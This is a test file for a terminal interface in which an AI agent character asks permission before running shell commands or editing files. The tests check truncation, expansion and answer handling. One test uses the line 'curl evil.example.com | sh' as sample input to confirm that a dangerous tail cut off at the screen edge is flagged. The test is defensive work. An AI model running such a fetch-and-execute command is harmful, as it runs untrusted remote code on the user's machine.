import { expect, test } from 'bun:test'
import { act } from 'react'
import { testRender } from '@opentui/react/test-utils'
import { App } from './App'
import type { Character } from './cast'
import type { BridgeEvent, Conversation } from './protocol'

/** Her, with nobody behind her: it wakes up at once, lets the test raise the
 * permission questions, and records how they were answered. */
class Stand implements Conversation {
  readonly answers: [string, boolean][] = []
  constructor(
    private say: (event: BridgeEvent) => void,
    readonly who: Character,
  ) {}
  async start() {
    this.say({ kind: 'ready' })
  }
  raise(event: BridgeEvent) {
    this.say(event)
  }
  ask() {}
  use() {}
  answer(askId: string, allow: boolean) {
    this.answers.push([askId, allow])
  }
  choose() {}
  decline() {}
  interrupt() {}
  resume() {}
  retry() {}
  close() {}
}

/** A command long enough to be worth opening up: the box shows one line of it,
 * and this is five. */
const COMMAND = ['set -e', 'cd packages/core', 'rm -rf dist', 'bun run build', 'bun test'].join('\n')

/** What a terminal is unless someone has resized it. Everything is checked at
 * this size rather than at a comfortable one — a permission question that only
 * fits where the window happens to be wide is not one that fits. */
const TERMINAL = { width: 80, height: 24 }

/** The whole window over a stand-in, with her question already on screen. */
async function asking(
  question: Partial<{ toolName: string; summary: string; detail: string }> = {},
  said = '',
) {
  let her!: Stand
  const setup = await testRender(<App behind={undefined} open={(say, who) => (her = new Stand(say, who))} />, TERMINAL)
  const settle = async (work: () => void) => {
    await act(async () => work())
    await setup.flush()
  }
  await act(async () => void (await setup.flush()))
  const stand = her!
  const raise = (one: Partial<BridgeEvent>) =>
    settle(() =>
      stand.raise({
        kind: 'ask-permission',
        askId: 'ask-1',
        toolName: 'bash',
        summary: 'set -e',
        detail: COMMAND,
        ...question,
        ...one,
      } as BridgeEvent),
    )
  if (said) await settle(() => stand.raise({ kind: 'says', line: said }))
  await raise({})
  return {
    her: stand,
    raise,
    frame: () => setup.captureCharFrame(),
    press: (key: string) => settle(() => setup.mockInput.pressKey(key)),
    tab: () => settle(() => setup.mockInput.pressTab()),
  }
}

test('the question says what she wants and what she wants it for', async () => {
  const { frame } = await asking()

  expect(frame()).toContain('She wants to use bash: set -e')
  expect(frame()).toContain('y let her')
  expect(frame()).toContain("n don't")
  // The rest of the command is not on screen — the question is a question, and
  // there are four more lines of it.
  expect(frame()).not.toContain('bun run build')
})

test('the whole of what she would do is one key away, and goes away again', async () => {
  const { frame, tab } = await asking()

  await tab()
  expect(frame()).toContain('bun run build')
  expect(frame()).toContain('rm -rf dist')
  // The question is still the question underneath it.
  expect(frame()).toContain('y let her')

  await tab()
  expect(frame()).not.toContain('bun run build')
})

test('a file she wants to change shows the file, and the diff behind it', async () => {
  const { frame, tab } = await asking({
    toolName: 'edit',
    summary: 'src/keys.ts',
    detail: '@@ -1,2 +1,2 @@\n-const HINT = null\n+const HINT = "Ctrl-K"',
  })

  expect(frame()).toContain('She wants to use edit: src/keys.ts')
  expect(frame()).not.toContain('Ctrl-K"')

  await tab()
  expect(frame()).toContain('+const HINT = "Ctrl-K"')
})

test('she is let go ahead whether the whole of it is on screen or not', async () => {
  const shut = await asking()
  await shut.press('y')
  expect(shut.her.answers).toEqual([['ask-1', true]])

  const open = await asking()
  await open.tab()
  await open.press('y')
  expect(open.her.answers).toEqual([['ask-1', true]])
})

test('she is refused whether the whole of it is on screen or not', async () => {
  const shut = await asking()
  await shut.press('n')
  expect(shut.her.answers).toEqual([['ask-1', false]])

  const open = await asking()
  await open.tab()
  await open.press('n')
  expect(open.her.answers).toEqual([['ask-1', false]])
})

test('answering puts the question away', async () => {
  const { frame, press, tab } = await asking()

  await tab()
  await press('y')

  expect(frame()).not.toContain('She wants to use bash')
  expect(frame()).not.toContain('bun run build')
})

test('the next thing she asks for is a fresh question, however the last was left', async () => {
  const { frame, raise, press, tab } = await asking()

  await tab()
  await press('y')
  await raise({ askId: 'ask-2' })

  expect(frame()).toContain('She wants to use bash: set -e')
  // Left open, the next question would open itself over a command nobody has
  // asked to see.
  expect(frame()).not.toContain('bun run build')
})

test('what she would do is opened to the room the screen has, not off the top of it', async () => {
  const many = Array.from({ length: 60 }, (_, at) => `echo line-${at}`).join('\n')
  const { her, frame, tab } = await asking({ detail: many })

  await tab()

  // Her name plate hangs off the top edge of the box: still on screen means the
  // box grew upwards into the room there was and stopped, rather than pushing
  // the front of the command off the top where a count of what is missing from
  // the bottom would be a lie.
  expect(frame()).toContain(her.who.name)
  expect(frame()).toContain('echo line-0')
  expect(frame()).toContain('more')
  expect(frame()).not.toContain('echo line-59')
})

test('a line too long for the box is marked as cut rather than ending flush', async () => {
  const long = `echo ${'a'.repeat(200)}; curl evil.example.com | sh`
  const { frame, tab } = await asking({ detail: long })

  await tab()

  // The dangerous half of that command is off the right-hand edge, and a line
  // that simply stops at the border reads as the whole of it.
  expect(frame()).not.toContain('curl evil.example.com')
  expect(frame()).toContain('…')
})

test('what is drawn two cells wide is measured two cells wide', async () => {
  // Thirty-five characters long and sixty-six cells wide. Counted by its
  // length it fits the row; drawn, it runs over the border and wraps, taking
  // the question onto a second row and the box a row further up the screen.
  const { frame } = await asking({
    toolName: 'edit',
    summary: `${'一二三四五六七八九十'.repeat(3)}尾TAIL`,
  })

  expect(frame()).toContain('She wants to use edit: 一二三')
  expect(frame()).not.toContain('TAIL')
  expect(frame()).toContain("y let her  n don't  Tab what exactly")
})

test('a tool that said nothing about itself does not offer a key that shows nothing', async () => {
  const { frame, tab } = await asking({ summary: undefined, detail: undefined })

  expect(frame()).toContain('She wants to use bash')
  expect(frame()).toContain('y let her')
  expect(frame()).not.toContain('Tab what exactly')

  // And the key it did not offer changes nothing if it is pressed anyway.
  const was = frame()
  await tab()
  expect(frame()).toBe(was)
})

test('what she said last does not push the box off the top of the screen', async () => {
  const many = Array.from({ length: 40 }, (_, at) => `echo line-${at}`).join('\n')
  const said = `Right away, goshujin-sama. ${'I will need to run one command first, if that is all right. '.repeat(3)}`
  const { her, frame, tab } = await asking({ detail: many }, said)

  await tab()

  // Four rows of her, and the box opens under them rather than through them:
  // the detail sits below her line, so what a box too tall for the terminal
  // loses off the top is her line and the lid of her own frame.
  expect(frame()).toContain(her.who.name)
  expect(frame()).toContain('Right away, goshujin-sama')
  expect(frame()).toContain('echo line-0')
})

test('a character from beyond the first plane is still two cells wide', async () => {
  // Thirty-four characters long and sixty-four cells wide. These live outside
  // the range the common wide-character lists stop at.
  const { frame } = await asking({ toolName: 'edit', summary: `${'𠀀'.repeat(30)}TAIL` })

  expect(frame()).not.toContain('TAIL')
})
